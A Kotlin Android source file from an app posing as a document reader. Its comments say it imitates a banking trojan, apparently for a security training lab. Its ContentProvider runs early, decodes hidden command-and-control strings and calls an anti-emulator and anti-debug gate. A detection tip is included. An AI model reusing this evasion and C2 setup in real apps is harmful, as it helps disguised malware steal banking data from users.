package com.docreader.lite.reader.init

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.net.Uri
import com.docreader.lite.reader.engine.SafetyCheck
import com.docreader.lite.reader.engine.ResourceDecoder

/**
 * ContentProvider pre-Application init hook.
 *
 * ContentProvider.onCreate() runs BEFORE Application.onCreate().
 * Banker uses this for earliest possible initialization:
 *   1. Environment check (anti-emulator/debug/frida)
 *   2. String decryption (decode C2 URLs, target packages)
 *   3. Hook installation (if using reflection-based hooks)
 *
 * LabActivationProvider in Takopii trainer uses same pattern defensively.
 * Here: used offensively for earliest-possible evasion gate evaluation.
 *
 * Detection: exported=false ContentProvider with no URI handler = suspicious.
 * No legit app ships a ContentProvider that provides no data.
 */
class ReaderInitProvider : ContentProvider() {

    override fun onCreate(): Boolean {
        val ctx = context ?: return true

        // Earliest possible init — runs before Application.onCreate()

        // Step 1: Decode obfuscated strings (prepare C2 URLs, target names)
        // In real banker: all string constants decoded here, cached in memory.
        // jadx shows only byte arrays in static analysis.
        initDecodedStrings()

        // Step 2: Run environment gate
        // If hostile environment detected HERE, Application.onCreate()
        // can skip all stealer init entirely.
        SafetyCheck.evaluate(ctx)

        return true
    }

    private fun initDecodedStrings() {
        // Touch the lazy-initialized Strings object to force decode
        // In real banker, this populates a cache of decoded strings
        // that the rest of the app references at runtime.
        try {
            ResourceDecoder.Strings.C2_REGISTER
            ResourceDecoder.Strings.C2_COMMANDS
            ResourceDecoder.Strings.C2_EXFIL
        } catch (_: Exception) {}
    }

    // ─── ContentProvider contract — all no-ops (this is not a real provider) ──
    override fun query(u: Uri, p: Array<String>?, s: String?, a: Array<String>?, o: String?): Cursor? = null
    override fun getType(uri: Uri): String? = null
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, sel: String?, args: Array<String>?): Int = 0
    override fun update(uri: Uri, v: ContentValues?, s: String?, a: Array<String>?): Int = 0
}
